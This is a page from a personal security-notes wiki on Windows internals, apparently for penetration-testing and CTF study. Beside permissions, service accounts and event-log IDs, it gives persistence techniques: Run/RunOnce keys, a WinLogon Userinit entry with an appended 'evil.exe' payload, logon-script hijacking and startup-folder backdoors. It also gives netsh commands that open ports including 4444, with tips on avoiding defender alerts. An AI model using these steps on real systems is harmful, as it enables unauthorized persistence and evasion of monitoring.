data-for="tales/2021-12-08-blaster">Blaster</a></li><li><a href="../tales/2021-12-14-overpass-2" data-for="tales/2021-12-14-overpass-2">Overpass 2: Hacked</a></li><li><a href="../tales/2021-12-30-attacktive-directory" data-for="tales/2021-12-30-attacktive-directory">Attacktive Directory</a></li><li><a href="../tales/2022-01-02-retro" data-for="tales/2022-01-02-retro">Retro</a></li><li><a href="../tales/2022-01-30-tools-r-us" data-for="tales/2022-01-30-tools-r-us">Tools‘R’us</a></li><li><a href="../tales/2022-02-01-inclusion" data-for="tales/2022-02-01-inclusion">Inclusion</a></li><li><a href="../tales/2022-02-02-jurassic-park" data-for="tales/2022-02-02-jurassic-park">Jurassic Park</a></li><li><a href="../tales/2022-04-03-net-sec-challenge" data-for="tales/2022-04-03-net-sec-challenge">Net sec challenge</a></li><li><a href="../tales/2023-04-27-union" data-for="tales/2023-04-27-union">Union</a></li></ul></div></li></ul></div></li><li id="explorer-end"></li></ul></div></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../spellbook/">Spellbook</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>Windows</a></div></nav><h1 class="article-title">Windows</h1><p show-comma="true" class="content-meta"><span>July 31, 2024</span><span>1 min read</span></p></div></div><article class="popover-hint"><h2 id="basics">Basics<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#basics" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="common-user-types">Common user types<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#common-user-types" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="common-windows-user-types" data-block data-embed-alias="undefined"><h1>Common Windows user types</h1><ul>
<li>Local Admin</li>
<li>Local User</li>
<li>Guest User</li>
<li>Domain User</li>
<li>Domain Admin</li>
</ul>
<p>Note that non-admin domain users may still be local admins.</p><a href="../spells/common-windows-user-types" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="important-local-service-accounts">Important local service accounts<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#important-local-service-accounts" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-local-service-accounts" data-block data-embed-alias="undefined"><h1>Windows local service accounts</h1><ul>
<li>LocalSystem — The account used by the OS itself; essentially <em>more</em> powerful than an normal user account in the Administrators group.</li>
<li>Local Service — The default account used by <a href="../spells/windows-local-service-accounts/../../spellbook/windows-services" class="internal alias" data-slug="spellbook/windows-services">Windows services</a>; it has minimal privileges and uses anonymous network connections.</li>
<li>Network Service — Essentially the same as the Local Service user, but uses the OS (“computer”) credentials when authenticating over the network.</li>
</ul><a href="../spells/windows-local-service-accounts" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="permissions">Permissions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#permissions" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-permissions" data-block data-embed-alias="undefined"><h1>Windows permissions</h1><p><a href="../spells/windows-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> access is default-deny.</p>
<p><a href="../spells/windows-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> folder permissions:</p>
<ul>
<li>Read — Permits viewing and listing of files and subfolders</li>
<li>Write — Permits adding of files and subfolders</li>
<li>Read &amp; Execute — Permits viewing and listing of files and subfolders as well as executing of files; inherited by files and folders</li>
<li>List Folder Contents — Permits viewing and listing of files and subfolders as well as executing of files; inherited by folders only</li>
<li>Modify — Permits reading and writing of files and subfolders as well as executing of files; allows deletion of the folder</li>
<li>Full Control — Permits reading, writing, changing, and deleting of files and subfolders</li>
</ul>
<p><a href="../spells/windows-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> file permissions:</p>
<ul>
<li>Read — Permits viewing or accessing of the file’s contents</li>
<li>Write — Permits writing to a file</li>
<li>Read &amp; Execute — Permits viewing and accessing of the file’s contents as well as executing of the file</li>
<li>List Folder Contents — N/A</li>
<li>Modify — Permits reading and writing of the file as well as executing of the file; allows deletion of the file</li>
<li>Full Control — Permits reading, writing, changing and deleting of the file</li>
</ul>
<p>The biggest differences between <a href="../spells/windows-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> and <a href="../spells/windows-permissions/../../spellbook/unix-permissions" class="internal alias" data-slug="spellbook/unix-permissions">UNIX</a> permissions:</p>
<ul>
<li><a href="../spells/windows-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> doesn’t have as fine-grained of control <em>for a given user or group</em>.</li>
<li><a href="../spells/windows-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> has <em>much more</em> fine-grained control across users and groups (there’s no limit of three permission sets).</li>
<li>The ability to delete a folder or file, and to change its permissions, are essentially considered to be distinct “sub-permissions”.</li>
</ul>
<p>As much as it pains me to say it, in many ways the <a href="../spells/windows-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> permission mode is much better than the (pre-ACL) <a href="../spells/windows-permissions/../../spellbook/linux" class="internal alias" data-slug="spellbook/linux">Linux</a> model.</p><a href="../spells/windows-permissions" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="paths">Paths<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#paths" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="unquoted-path-handling-in-windows" data-block data-embed-alias="undefined"><h1>Unquoted path handling in Windows</h1><p>When <a href="../spells/unquoted-path-handling-in-windows/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> encounters an unquoted path it tries <em>all</em> possible paths, from shortest to longest. Thus <code>C:\Program Files\Application Path\App.exe</code> will cause <a href="../spells/unquoted-path-handling-in-windows/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> to look for the following executables, in order:</p>
<ul>
<li><code>C:\Program.exe</code></li>
<li><code>C:\Program Files\Application.exe</code></li>
<li><code>C:\Program Files\Application Path\App.exe</code></li>
</ul>
<p>If an executable is found on a shorter path, then the remainder of the (unquoted) path is treated as command line parameters.</p><a href="../spells/unquoted-path-handling-in-windows" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="startup">Startup<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#startup" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h4 id="startup-folder">Startup folder<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#startup-folder" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="windows-startup-folder" data-block data-embed-alias="undefined"><h1>Windows Startup folder</h1><p>Individual startup folders are located at <code>C:\Users\$USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> .</p>
<p>The shared startup folder is at <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code>; any shortcut placed here will spawn an application on <em>any</em> (normal) user login.</p>
<p>(The “contents” of a user’s Startup folder is the union of these two folders. If memory serves, the user folder will override the system folder for items with <em>exactly</em> the same name. Note that executables can be dropped into this folder in addition to shortcuts, though doing so may make it more difficult to hide a backdoor…)</p><a href="../spells/windows-startup-folder" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h4 id="runrunonce">Run/RunOnce<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#runrunonce" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="windows-run-and-runonce-registry-keys" data-block data-embed-alias="undefined"><h1>Windows Run and RunOnce Registry keys</h1><p>Startup programs can also be configured in the registry:</p>
<ul>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce </code></li>
</ul>
<p>HKCU applies to the current user, while HLKM applies to everyone.</p>
<p>Entries under Run will run every time the user logs on, while those under RunOnce will only be executed a single time.</p>
<p>Create a <code>REG_EXPAND_SZ</code> registry entry under the appropriate key that points to the appropriate payload.</p><a href="../spells/windows-run-and-runonce-registry-keys" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h4 id="winlogon">WinLogon<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#winlogon" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="how-to-exploit-the-winlogon-initialization-sequence" data-block data-embed-alias="undefined"><h1>How to exploit the WinLogon initialization sequence</h1><p>WinLogin is a <a href="../spells/how-to-exploit-the-winlogon-initialization-sequence/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> component that loads a user profile right after authentication (amongst other things). The WinLogin initialization sequence is defined in the <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon\</code> registry key. This will contain two values:</p>
<ul>
<li><code>Userinit</code>, which points to userinit.exe, and</li>
<li><code>shell</code> which usually points to explorer.exe.</li>
</ul>
<p><strong>Do not replace these files!</strong> Instead, follow the initial command with your payload, separating the two with a comma:</p>
<pre><code>C:\Windows\System32\userinit.exe,C:\Windows\System32\evil.exe
</code></pre><a href="../spells/how-to-exploit-the-winlogon-initialization-sequence" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h4 id="logon-scripts">Logon scripts<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#logon-scripts" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="windows-logon-scripts" data-block data-embed-alias="undefined"><h1>Windows logon scripts</h1><p>The userinit.exe binary checks for an environment variable called UserInitMprLogonScript. This variable isn’t set by default, but if defined then userinit.exe will run any script it specifies.</p>
<p>Unfortunately, there’s no way to set this globally — you have to do it one user at a time in the <code>HKCU\Environment</code> Registry key. Just create a new Expandable String Value entry called UserInitMprLogonScript in this key that points to the location of your payload.</p><a href="../spells/windows-logon-scripts" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="services">Services<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#services" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-services" data-block data-embed-alias="undefined"><h1>Windows services</h1><p>Note that <a href="../spellbook/windows-services/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> services need to use an additional set of API calls that are not normally implemented in regular executables. While it <em>is</em> possible to run a normal executable as a service, the command will not survive for long (making a stable reverse shell impossible) and will always registered as failed (potentially alerting defenders).</p>
<h2 id="service-security">Service security<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#service-security" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="windows-service-security" data-block data-embed-alias="undefined"><h1>Windows service security</h1><p>Service configurations are stored in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>; here the user is represented by the ObjectName value. DACLs are stored under each service as a Security sub-key.</p><a href="../spellbook/windows-services/../../spells/windows-service-security" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="loading-drivers">Loading drivers<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#loading-drivers" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-load-drivers-in-windows" data-block data-embed-alias="undefined"><h1>How to load drivers in Windows</h1><p>If binPath points to a driver (.sys) rather than an executable, then that driver will be loaded into the kernel when the service is started!</p><a href="../spellbook/windows-services/../../spells/how-to-load-drivers-in-windows" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/windows-services" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="firewall">Firewall<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#firewall" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="netsh" data-block data-embed-alias="undefined"><h1>netsh</h1><p>Check <a href="../spells/netsh/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Firewall state:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">netsh advfirewall show currentprofile</span></span></code></pre></figure>
<p>See all <a href="../spells/netsh/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Firewall rules for inbound connections:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">netsh advfirewall firewall show rule dir</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">in</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> name</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">all</span></span></code></pre></figure>
<p>Be aware that most built-in rules on <a href="../spells/netsh/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> are bound to particular applications. But admins are lazy, and seldom bind custom rules to explicit applications. There’s no 100% reliable way to identify custom rules from the command line, but they’ll often have obvious naming conventions.</p>
<p>See all <a href="../spells/netsh/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Firewall rules for outbound connections:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">netsh advfirewall firewall show rule dir</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">out name</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">all</span></span></code></pre></figure>
<p>Punch a hole in the <a href="../spells/netsh/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Firewall for ports 80, 443, and 4444:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">netsh advfirewall firewall add action</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">allow name</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tunnel_in </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">	dir</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">in</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> protocol</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tcp localport</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">80,443,4444</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">netsh advfirewall firewall add action</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">allow name</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tunnel_out </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">	dir</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">out protocol</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tcp localport</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">80,443,4444</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span></code></pre></figure>
<p>In general you don’t want to turn off the <a href="../spells/netsh/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Firewall, as doing so will generate a popup for any users currently logged into the machine.</p><a href="../spells/netsh" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="event-logs">Event logs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#event-logs" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-event-logs" data-block data-embed-alias="undefined"><h1>Windows event logs</h1><h2 id="log-types">Log types<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#log-types" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<ul>
<li>Application — Contains events logged by applications. For example, a database application might record a file error. The application developer decides which events to record.</li>
<li>Security — Contains events such as valid and invalid logon attempts, as well as events related to resource use such as creating, opening, or deleting files or other objects. An administrator can start auditing to record events in the security log.</li>
<li>System — Contains events logged by system components, such as the failure of a driver or other system component to load during startup.</li>
<li>[CustomLog] — Contains events logged by applications that create a custom log. Using a custom log enables an application to control the size of the log or attach ACLs for security purposes without affecting other applications.</li>
</ul>
<h2 id="log-fields">Log fields<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#log-fields" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<ul>
<li>Type — Warning, error, information, etc.</li>
<li>Time — Date/time for the computer <em>sending</em> the log</li>
<li>Computer — Computer name</li>
<li>Provider Type — The facility that generated the event (generally the <a href="../spellbook/windows-event-logs/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Event Log)</li>
<li>Provider Name — The name of the log (Application, Security, etc.)</li>
<li>Source — Application</li>
<li><a href="../spellbook/windows-event-logs/../../spells/windows-event-ids" class="internal alias" data-slug="spells/windows-event-ids">Event ID</a> — Standardized (<em>not</em> unique!) identifier</li>
<li>Description — Self-explanatory</li>
</ul>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/eventlog/eventlog-key" class="external" target="_blank">Microsoft has more detailed documentation.<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
<h2 id="event-types">Event types<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#event-types" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<ul>
<li>Error — An event that indicates a significant problem such as loss of data or loss of functionality. For example, if a service fails to load during startup, an Error event is logged.</li>
<li>Warning — An event that is not necessarily significant, but may indicate a possible future problem. For example, when disk space is low, a Warning event is logged. If an application can recover from an event without loss of functionality or data, it can generally classify the event as a Warning event.</li>
<li>Information — An event that describes the successful operation of an application, driver, or service. For example, when a network driver loads successfully, it may be appropriate to log an Information event. Note that it is generally inappropriate for a desktop application to log an event each time it starts.</li>
<li>Success Audit — An event that records an audited security access attempt that is successful. For example, a user’s successful attempt to log on to the system is logged as a Success Audit event.</li>
<li>Failure Audit — An event that records an audited security access attempt that fails. For example, if a user tries to access a network drive and fails, the attempt is logged as a Failure Audit event.</li>
</ul>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-types" class="external" target="_blank">Microsoft has more detailed documentation.<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
<h2 id="event-ids">Event IDs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#event-ids" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="windows-event-ids" data-block data-embed-alias="undefined"><h1>Windows event IDs</h1><ul>
<li>104 — <a href="../spells/windows-event-ids/../../spellbook/windows-event-logs" class="internal alias" data-slug="spellbook/windows-event-logs">Event log</a> was cleared</li>
<li><a href="https://support.alertlogic.com/hc/en-us/articles/115004121423-Windows-Security-Event-Log-Cleared" class="external" target="_blank">1102<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> — Audit log was cleared (<a href="https://serverfault.com/questions/743575/how-to-find-out-who-deleted-event-viewer-logs/743577#743577" class="external" target="_blank">517<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> on Windows 2003 and earlier)</li>
<li>4104 — <a href="../spells/windows-event-ids/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> command and script logging</li>
<li>4626 — Successful logon
<ul>
<li>LogonType 3 represents a (generic) network login</li>
<li>LogonType 9 represents a logon where the outbound credentials are different than the credentials used to authenticate to the account that is initiating that login (only logged by the host <em>initiating</em> the connection, however)</li>
</ul>
</li>
</ul>
<p>It’s hard to find documentation about event ID, and the meaning seems to shift between versions of <a href="../spells/windows-event-ids/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a>.</p><a href="../spellbook/windows-event-logs/../../spells/windows-event-ids" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/windows-event-logs" class="internal transclude-src">Link to original</a></blockquote><p></p>
